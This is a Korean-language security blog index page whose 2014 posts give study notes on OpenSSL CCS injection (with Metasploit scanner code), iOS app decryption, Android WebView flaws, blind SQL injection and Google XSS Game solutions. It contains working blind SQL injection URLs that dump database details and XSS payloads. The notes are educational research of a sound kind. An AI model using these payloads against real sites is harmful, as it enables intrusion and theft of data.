
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>KC's blog</title>
  <meta name="author" content="KC">

  
  <meta name="description" content="Original Post Original post 는 다음과 같다. 발견자는 Masashi Kikuchi 씨. How I discovered CCS Injection Vulnerability (CVE-2014-0224) ChangeCipherSpec 이라는 메시지는 &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://zomo.heroku.com/posts/13/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="KC's blog" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">KC's blog</a></h1>
  
    <h2>A blogging framework for hackers.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="zomo.heroku.com">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/06/23/openssl-changecipherspec-vulnerability-cve-2014-0224/">OpenSSL: ChangeCipherSpec Vulnerability (CVE-2014-0224)</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-06-23T09:23:27+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>9:23 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h4>Original Post</h4>

<p>Original post 는 다음과 같다. 발견자는 Masashi Kikuchi 씨.</p>

<p><a href="http://ccsinjection.lepidum.co.jp/blog/2014-06-05/CCS-Injection-en/index.html">How I discovered CCS Injection Vulnerability (CVE-2014-0224)</a></p>

<p>ChangeCipherSpec 이라는 메시지는 정해진 스텝에서만 주고받아야 하는데, 서버가 막 받아주는 것이 문제.</p>

<p>ChangeCipherSepc 은 무얼까? 세션키에 기반한 symmetric encryption 모드로 전환하자는 신호. Pre-master secret 을 교환하고나서 이제 session key 를 계산해서 symmetric encryption 모드로 가자! 라는 신호. 기술적으로는 1 바이트 메시지. 페이로드는 0x01.</p>

<pre><code>In a correct handshake, the client and the server exchange messages 
in the order as depicted in this figure. 
(See RFC5246 The Transport Layer Security (TLS) Protocol Version 1.2 §7.3)。

ChangeCipherSpec MUST be sent at these positions in the handshake. 
OpenSSL sends CCS in exact timing itself. 
However, it accepts CCS at other timings when receiving. 
Attackers can exploit this behavior so that they can decrypt and/or 
modify data in the communication channel.
</code></pre>

<p>Full handshake 의 예를 들면, ClientHello, ServerHello, ClientKeyExchange 가 되고, ChangeCipherSpec 이 들어가야한다.</p>

<p>발견자에 따르면, TLS IETF draft 에 있는 다음 문장이 취약점을 만든 이유라고.</p>

<pre><code>Note:          To help avoid pipeline stalls, ChangeCipherSpec is
               an independent SSL Protocol content type, and is not
               actually an SSL handshake message.
</code></pre>

<p>handshake message 타입이 아니라 독립적인 프로토콜 타입으로 되어있는데, 그 이유는</p>

<p><a href="http://security.stackexchange.com/questions/24755/why-is-change-cipher-spec-an-independent-protocol-content-type-and-not-part-of-h">Why is change cipher spec an independent protocol content type and not part of Handshake Messages?</a></p>

<h4>PoC</h4>

<p><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/ssl/openssl_ccs.rb">Metasploit openssl_ccs.rb module</a> 을 보면,</p>

<p><code>Client_Hello</code> 를 보내고, <code>Server_Hello</code> 를 받아준 다음에 바로 CCS (0x01) 을 보낸다. 만약 Alert 이 뜨지 않으면 vulnerable 하다고 본다.</p>

<pre><code>def ccs_injection
  connect_result = establish_connect
  return if connect_result.nil?

  vprint_status("#{peer} - Sending CCS...")
  sock.put(ccs)
  alert = sock.get_once(-1, response_timeout)
  if alert.blank?
    print_good("#{peer} - No alert after invalid CSS message, probably vulnerable")
    report
  elsif alert.unpack("C").first == ALERT_RECORD_TYPE
    vprint_error("#{peer} - Alert record as response to the invalid CCS Message, probably not vulnerable")
  elsif alert
    vprint_warning("#{peer} - Unexpected response.")
  end
end

def establish_connect
  connect

  vprint_status("#{peer} - Sending Client Hello...")
  sock.put(client_hello)
  server_hello = sock.get(response_timeout)

  unless server_hello
    vprint_error("#{peer} - No Server Hello after #{response_timeout} seconds...")
    disconnect
    return nil
  end

  unless server_hello.unpack("C").first == HANDSHAKE_RECORD_TYPE
    vprint_error("#{peer} - Server Hello Not Found")
    return nil
  end

  true
end
</code></pre>

<h4>Code</h4>

<p>실제 코드를 분석한 블로그를 보면</p>

<p><a href="https://www.imperialviolet.org/2014/06/05/earlyccs.html">Early ChangeCipherSpec Attack (05 Jun 2014)</a></p>

<p>ServerHello 이후에 CCS 가 inject 되면, 취약한 키가 생성되는게 핵심.
추후에 CCS 가 더 inject 되더라도 한번 생성된 키는 고정되버리는 것도 문제.</p>

<pre><code>If a ChangeCipherSpec message is injected into the connection after the ServerHello, 
but before the master secret has been generated, 
then ssl3_do_change_cipher_spec will generate the keys (2) and 
the expected Finished hash (3) for the handshake with an empty master secret. 
This means that both are based only on public information. 
Additionally, the keys will be latched because of the check at (1) - 
further ChangeCipherSpec messages will regenerate the expected Finished hash, but not the keys.
</code></pre>

<p>코드를 보면,</p>

<pre><code>int ssl3_do_change_cipher_spec(SSL *s)
        {
        int i;
        const char *sender;
        int slen;

        if (s-&gt;state &amp; SSL_ST_ACCEPT)
                i=SSL3_CHANGE_CIPHER_SERVER_READ;
        else
                i=SSL3_CHANGE_CIPHER_CLIENT_READ;

        if (s-&gt;s3-&gt;tmp.key_block == NULL) &lt;---- 1
                {
                if (s-&gt;session == NULL)
                        {
                        /* might happen if dtls1_read_bytes() calls this */
                        SSLerr(SSL_F_SSL3_DO_CHANGE_CIPHER_SPEC,SSL_R_CCS_RECEIVED_EARLY);
                        return (0);
                        }

                s-&gt;session-&gt;cipher=s-&gt;s3-&gt;tmp.new_cipher;
                if (!s-&gt;method-&gt;ssl3_enc-&gt;setup_key_block(s)) return(0); &lt;---- 2
                }

        if (!s-&gt;method-&gt;ssl3_enc-&gt;change_cipher_state(s,i))
                return(0);

        /* we have to record the message digest at
         * this point so we can get it before we read
         * the finished message */
        if (s-&gt;state &amp; SSL_ST_CONNECT)
                {
                sender=s-&gt;method-&gt;ssl3_enc-&gt;server_finished_label;
                slen=s-&gt;method-&gt;ssl3_enc-&gt;server_finished_label_len;
                }
        else
                {
                sender=s-&gt;method-&gt;ssl3_enc-&gt;client_finished_label;
                slen=s-&gt;method-&gt;ssl3_enc-&gt;client_finished_label_len;
                }

        i = s-&gt;method-&gt;ssl3_enc-&gt;final_finish_mac(s,
                sender,slen,s-&gt;s3-&gt;tmp.peer_finish_md); &lt;---- 3
        if (i == 0)
                {
                SSLerr(SSL_F_SSL3_DO_CHANGE_CIPHER_SPEC, ERR_R_INTERNAL_ERROR);
                return 0;
                }
        s-&gt;s3-&gt;tmp.peer_finish_md_len = i;

        return(1);
        }
</code></pre>

<h4>MitM</h4>

<p>이 버그를 가지고 Man-in-the-Middle 을 하는 시나리오를 생각해보자.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/06/20/ssl-strip/">SSL Strip</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-06-20T11:57:47+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>11:57 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><ul>
<li><a href="https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf">New Tricks for Defeating SSL in Practice - Black Hat 2009</a></li>
<li><a href="https://www.blackhat.com/presentations/bh-usa-09/MARLINSPIKE/BHUSA09-Marlinspike-DefeatSSL-SLIDES.pdf">More Tricks for Defeating SSL in Pracetice - Black Hat</a></li>
<li><a href="http://www.youtube.com/watch?v=Z7Wl2FW2TcA">SSL and the Future of Authenticity</a></li>
<li><a href="http://www.thoughtcrime.org/blog/">Moxie Marlinspike&rsquo;s Blog</a></li>
</ul>


<p>BlackHat USA 2011 에 발표되었던 <a href="http://www.youtube.com/watch?v=Z7Wl2FW2TcA">SSL And The Future of Authenticity</a> 를 보았다.</p>

<p>Comodo 해킹 이슈를 예로 들면서 현재 인터넷에서 쓰이는 PKI 가 맛이 갔음을 이야기한다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/06/20/recent-openssl-vulnerabilities/">Recent OpenSSL Vulnerabilities</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-06-20T10:36:24+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>10:36 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h4><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224">CVE-2014-0224 a.k.a ChangeCipherSpec</a></h4>

<p>OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h does not properly restrict processing of ChangeCipherSpec messages, which allows man-in-the-middle attackers to trigger use of a zero-length master key in certain OpenSSL-to-OpenSSL communications, and consequently hijack sessions or obtain sensitive information, via a crafted TLS handshake, aka the &ldquo;CCS Injection&rdquo; vulnerability.</p>

<ul>
<li><a href="http://ccsinjection.lepidum.co.jp/blog/2014-06-05/CCS-Injection-en/index.html">How I discovered CCS Injection Vulnerability (CVE-2014-0224)</a></li>
<li><a href="https://gist.github.com/rcvalle/71f4b027d61a78c42607">ccsinjection.c</a></li>
<li><a href="https://gist.github.com/rcvalle/585e12e4d5d3b658cd3d">ccsinjection_server.c</a></li>
</ul>


<h4><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0221">CVE-2014-0221</a></h4>

<p>The dtls1_get_message_fragment function in d1_both.c in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h allows remote attackers to cause a denial of service (recursion and client crash) via a DTLS hello message in an invalid DTLS handshake.</p>

<h4><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0195">CVE-2014-0195</a></h4>

<p>The dtls1_reassemble_fragment function in d1_both.c in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h does not properly validate fragment lengths in DTLS ClientHello messages, which allows remote attackers to execute arbitrary code or cause a denial of service (buffer overflow and application crash) via a long non-initial fragment.</p>

<ul>
<li><a href="http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/ZDI-14-173-CVE-2014-0195-OpenSSL-DTLS-Fragment-Out-of-Bounds/ba-p/6501002#.U5ER15SSyYl">ZDI-14-173/CVE-2014-0195 - OpenSSL DTLS Fragment Out-of-Bounds Write: Breaking up is hard to do</a></li>
</ul>


<h4><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160">CVE-2014-0160 a.k.a HeartBleed</a></h4>

<p>The (1) TLS and (2) DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys, related to d1_both.c and t1_lib.c, aka the Heartbleed bug.</p>

<ul>
<li><a href="http://heartbleed.com/">HeartBleed.com</a></li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/06/20/decrypting-ios-apps/">Decrypting iOS Apps</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-06-20T10:22:20+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>10:22 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="http://www.infointox.net/?p=114">Decrypting iOS Apps</a></p>

<p>evasi0n 으로 iPod 를 Jailbreak 했다.</p>

<p>openssh 패키지를 설치하고, <code>ssh root@XXX.XXX.XXX.XXX</code> 로 접속했다.
그리고, <code>root</code> 와 <code>mobile</code> 의 password 를 세팅하였다.</p>

<h4>Extract the application</h4>

<p><code>/private/var/mobile/Applications/</code> 에서 타겟을 담고 있는 디렉토리를 찾았다.</p>

<p><code>/private/var/mobile/Application/D411A4CE-B33E-4EFE-9041-E356718123EE/OM1X.app/OM1X</code> 가 찾는 바이너리.</p>

<p>scp 로 OM1X 를 가져온다.</p>

<pre><code># otool -arch all -Vh OM1X
OM1X:
Mach header
      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
   MH_MAGIC     ARM          9  0x00     EXECUTE    33       4056   NOUNDEFS DYLDLINK TWOLEVEL BINDS_TO_WEAK PIE
</code></pre>

<h4>Find encrypted area</h4>

<p>이제 암호화된 부분을 찾아야 한다.</p>

<pre><code># otool -arch all -Vl TM1G | grep -A5 LC_ENCRYP
          cmd LC_ENCRYPTION_INFO
      cmdsize 20
 cryptoff  16384
 cryptsize 819200
 cryptid   1
Load command 12
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/06/20/add-js-interface-mitm/">Add_js_interface_mitm</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-06-20T09:13:56+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>9:13 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Metasploit 에 들어간 add_js_interface_mitm.rb 를 훑어보았다.</p>

<p>일단 vulnerable 한 WebView 의 예제는 다음과 같다.</p>

<pre><code>public class MainActivity extends Activity {

    @SupressLint({ "SetJavaScriptEnabled", "JavascriptInterface" })
    @Override
        protected void onCreate(Bundle savedInstanceState) {
            ...
            WebView myWebView = (WebView) findViewById(R.id.webView1);

            // not a good idea!
            WebSettings webSettings = myWebView.getSettings();
            webSettings.setJavaScriptEnabled(true);

            // terrible idea!
            myWebView.addJavascriptInterface(new WebAppInterface(this), "Android");

            myWebView.loadUrl("http://droidsec.org/addjsif.html");
            ...
</code></pre>

<h4>PoC</h4>

<p><a href="https://github.com/jduck/addjsif/blob/master/add_js_interface_mitm.rb">Metasploit add_js_interface_mitm.rb 모듈</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/06/18/android-telephony-api/">Android Telephony API</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-06-18T14:00:58+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>2:00 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h4>Android Telephony APIs</h4>

<p>훑어야 할 API 들.</p>

<ul>
<li>getDeviceId()</li>
<li>getSubscriberId()</li>
<li>getLine1Number</li>
<li>getSimCountryIso()</li>
<li>getSimOperator()</li>
<li>getSimSerialNumber</li>
<li>getSimState()</li>
<li>getVoiceMailNumber()</li>
</ul>


<h4>References</h4>

<ul>
<li><a href="http://en.wikipedia.org/wiki/List_of_CDMA_terminology">List of CDMA terminology</a></li>
<li><a href="http://developer.android.com/reference/android/telephony/TelephonyManager.html">public class TelephonyManager</a></li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/06/18/a-bug-hunters-diary/">A Bug Hunter's Diary</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-06-18T12:12:09+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>12:12 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h3>VLC 0.9.4 on the Microsoft Windows Vista SP1 (32-bit)</h3>

<h4>integer</h4>

<p>vlc-0.9.4\include\vlc_demux.h</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/06/14/blind-sql-injection/">Blind SQL Injection</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-06-14T01:49:20+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>1:49 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h4>Blind SQL injection</h4>

<p>Case</p>

<pre><code>UNAME = "' or (ascii(substr(select user(),1,1))&gt;63) --"
PASS = ""
QUERY = "select * from users where uname='" +UNAME+ "' and pass='" +PASS+ "'"
</code></pre>

<p>이런 상황에서 QUERY 는 다음과 같이 eval 된다.</p>

<pre><code>select * from users where uname='' or (ascii(substr(select user(),1,1))&gt;63) --' and pass=''
</code></pre>

<p><code>uname=''</code> 을 만족하는 row 는 없을테니, <code>or</code> 뒷부분에 따라, 전체 query 의 결과가 달라진다.
이 차이가 HTTP Response Code 로 나타날 수도 있고, data 의 내용에 차이가 생길수도 있다.
SQL WaitFor 로 Delay 를 삽입할 수도 있다.
Query 결과가 화면에 덤프되지는 않지만, 이런 미세한 차이를 보고 query 의 결과값을 추측하는 것이다.</p>

<p>우선 DB 종류를 확인.</p>

<pre><code>http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20@@version),1,1))=94--
</code></pre>

<p>DB 이름을 덤프.</p>

<pre><code>http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20DB_NAME(0)),1,1))=94--
</code></pre>

<p>TABLE 을 덤프.</p>

<pre><code>http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20top%201%20TABLE_NAME%20from%20INFORMATION_SCHEMA.TABLES),1,1))=94--
</code></pre>

<p>TABLE schema 를 덤프.</p>

<pre><code>select top 1 COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='xxx_acesso';
</code></pre>

<p>그럼 쓸만한 query 들을 얻기 위해, Havij 가 사용하는 SQL query 들을 분석하도록 한다.</p>

<h4>Havij</h4>

<ul>
<li><a href="http://www.troyhunt.com/2012/10/hacking-is-childs-play-sql-injection.html">Hacking is child&rsquo;s play - SQL injection with Havij by 3 year old</a></li>
<li><a href="http://www.youtu.be/Fp47G4MQFvA">YouTube: Hacking is child&rsquo;s play - SQL injection with Havij by 3 year old</a></li>
</ul>


<h4>BBQSQL</h4>

<ul>
<li><a href="http://www.youtube.com/watch?v=Dh9Pa0kDfsc">DEFCON 20: Rapid Blind SQL Injection</a></li>
<li><a href="https://github.com/Neohapsis/bbqsql">bbqsql github repo</a></li>
</ul>


<h4>SQL injection 에 관해 읽을만한 글은</h4>

<ul>
<li><a href="https://media.blackhat.com/bh-us-12/Turbo/Galbreath/BH_US_12_Galbreath_Libinjection_Slides.pdf">libinjection</a></li>
<li><a href="http://www.slideshare.net/nickgsuperstar/new-techniques-in-sql-obfuscation">New Techniques in SQLi Obfuscation</a></li>
</ul>


<h4>Tools</h4>

<ul>
<li>bbqsql</li>
<li>sqlmap</li>
<li>sqlninja</li>
<li>BSQL Hacker</li>
<li>the Mole</li>
<li>Havij</li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/06/02/dissecting-the-android-bouncer/">Dissecting the Android Bouncer</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-06-02T10:00:56+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>2</span><span class='date-suffix'>nd</span>, <span class='date-year'>2014</span></span> <span class='time'>10:00 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>찰리 밀러의 발표 <a href="https://jon.oberheide.org/files/summercon12-bouncer.pdf">Dissecting The Android Bouncer</a> 를 읽어보았다.</p>

<h3>Android Bouncer</h3>

<p>마켓에 제출된 App 에 대한 자동화된 스캐닝을 수행하는 서비스. Malware 나 스파이웨어, Trojan 을 찾기 위함.</p>

<h3>Fingerprinting the bouncer</h3>

<p>C&amp;C 로 connect back 하는 간단한 앱을 안드로이드 마켓에 제출했다.</p>

<p>QEMU 베이스의 에뮬레이터에서 돌린다.</p>

<p><a href="http://static.usenix.org/event/woot09/tech/full_papers/paleari.pdf">A fistfull of red-pills: How to automatically generate procedures to detect CPU emulators</a></p>

<p>이 사람들&hellip; <a href="http://www.youtube.com/watch?v=ZEIED2ZLEbQ">Remote connect-back shell</a> 까지 돌려봤다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/06/01/google-xss-game-area/">Google XSS Game Area</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-06-01T18:52:28+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>6:52 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="http://xss-game.appspot.com/">Google XSS Game Area</a></p>

<h3>Level 1</h3>

<p>Search form 에</p>

<pre><code>a&lt;script&gt;alert('hi');&lt;/script&gt;
</code></pre>

<h3>Level 2</h3>

<pre><code>&lt;blockquote&gt; 안에서도 &lt;img&gt; 는 먹으니까. &lt;img src='hi.jpg' onerror='alert("hi");'&gt;
</code></pre>

<h3>Level 3</h3>

<pre><code>function chooseTab(num) {
    ...
    html += "&lt;img src='/static/level3/cloud" + num + ".jpg' /&gt;"
    $('#tabContent').html(html);

    window.location.hash = num;
    ...
}
...
window.onload = function() {
    if (event.source == parent) {
        chooseTab(self.location.hash.substr(1));
    }
}
</code></pre>

<p>URL 의 hash 부분에 html 이 influenced 되니까, 브라우저의 URL 표시창의 <code>#</code> 뒷부분에 입력한다.</p>

<pre><code>#'onerror="alert('hi');"&gt;
</code></pre>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/14">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/12">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour/">BSides Vienna 2015: Writing Your First Windows Exploit in Less Than One Hour</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/01/11/sock-sendpage/">Sock_sendpage</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/23/on-the-juniper-backdoor/">On the Juniper Backdoor</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/07/trustnone/">TRUSTNONE</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - KC -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
